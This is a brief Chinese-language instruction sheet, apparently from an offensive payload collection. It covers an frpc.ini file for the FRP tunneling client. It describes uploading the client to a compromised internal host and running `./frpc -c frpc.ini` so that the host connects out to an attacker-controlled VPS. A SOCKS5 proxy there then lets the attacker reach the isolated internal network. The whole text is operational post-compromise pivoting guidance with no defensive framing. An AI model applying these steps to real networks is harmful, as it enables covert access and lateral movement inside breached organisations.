## 📦 载荷使用说明：frpc.ini

### 📝 功能说明
FRP 内网穿透客户端配置文件，用于将内网服务映射到公网，或在内网建立 SOCKS5 代理隧道，方便攻击者从外部访问隔离网络。

### ⚙️ 参数说明
```text
- `server_addr`：FRP 服务端（公网 VPS）的 IP 地址
- `server_port`：FRP 服务端监听的绑定端口
- `[socks5]` 块：配置 SOCKS5 代理插件，`remote_port` 为在服务端暴露的代理端口
```

### 🚀 操作步骤
1. 在公网 VPS 启动 FRP 服务端（frps）。
2. 修改此 `frpc.ini` 文件，填入 VPS 的 IP 和端口。
3. 将 FRP 客户端二进制文件和此配置文件上传至内网目标主机。
4. 运行客户端：`./frpc -c frpc.ini`。
5. 在攻击机通过 VPS_IP:remote_port 使用 SOCKS5 代理访问内网。
